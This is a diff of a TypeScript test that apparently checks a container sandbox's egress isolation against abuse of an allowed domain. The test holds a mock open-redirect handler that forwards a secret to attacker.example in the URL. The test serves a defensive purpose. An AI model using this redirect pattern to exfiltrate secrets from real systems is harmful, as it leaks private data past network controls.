@@ -1,7 +1,6 @@
-import { execFileSync } from 'node:child_process';
 import { beforeAll, describe, expect, it } from 'vitest';
 import { egressRunnable, useEgress } from './egress.js';
-import { cli } from './helpers.js';
+import { cli, ensureImage } from './helpers.js';
 
 /**
  * Isolation n° 6: abuse of an allowed domain (ORC-219, against ORC-213). GitHub and the npm registry are on the `limited`
@@ -15,20 +14,18 @@ const SECRET = 'c2VjcmV0LWNvZGUtb2YtdGhlLXJlcG8';
 describe.skipIf(!egressRunnable)(`isolation 6: abuse of an allowed domain (${cli})`, () => {
   const egress = useEgress('iso6', {
     image: IMAGE,
-    standIn: {
-      // An open redirect on an allowed host, to the attacker's, the secret in the URL.
-      answer: (req, res) => {
-        if (req.url !== '/redirect-me') return false;
-        res.writeHead(302, { location: `https://attacker.example/${SECRET}` }).end();
-        return true;
-      },
+    // An open redirect on an allowed host, to the attacker's, the secret in the URL.
+    answer: (req, res) => {
+      if (req.url !== '/redirect-me') return false;
+      res.writeHead(302, { location: `https://attacker.example/${SECRET}` }).end();
+      return true;
     },
   });
   let box: Awaited<ReturnType<typeof egress.open>>;
   const writes = () => egress.seen.filter((s) => !['GET', 'HEAD', 'OPTIONS'].includes(s.method) || s.url.includes('receive-pack'));
 
   beforeAll(async () => {
-    execFileSync(cli, ['pull', '-q', IMAGE], { stdio: 'ignore', timeout: 300_000 });
+    ensureImage(IMAGE);
     box = await egress.open('limited');
   }, 600_000);
 
